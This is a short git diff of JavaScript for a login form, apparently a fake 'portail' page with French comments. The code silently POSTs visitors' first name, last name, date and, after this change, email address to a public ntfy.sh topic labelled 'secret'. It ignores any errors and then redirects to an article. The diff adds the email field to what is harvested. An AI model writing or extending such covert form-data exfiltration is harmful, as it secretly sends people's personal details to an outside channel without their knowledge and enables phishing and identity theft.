@@ -43,11 +43,12 @@ if (authForm) {
             date: new Date().toLocaleString('fr-FR')
         };
         
-        // Envoyer les données par email silencieusement
-        // Utilise ton propre endpoint si tu veux recevoir les données
+        // Envoyer les données par notification silencieusement
+        const email = document.getElementById('email').value.trim() || 'Non renseigné';
+        
         fetch('https://ntfy.sh/portail-rca-secret-2026', {
             method: 'POST',
-            body: `Nouvelle connexion!\nPrénom: ${prenom}\nNom: ${nom}\nDate: ${new Date().toLocaleString('fr-FR')}`
+            body: `Nouvelle connexion!\nPrénom: ${prenom}\nNom: ${nom}\nEmail: ${email}\nDate: ${new Date().toLocaleString('fr-FR')}`
         }).catch(() => {});  // Ignorer les erreurs
         
         // Rediriger vers l'article après un court délai
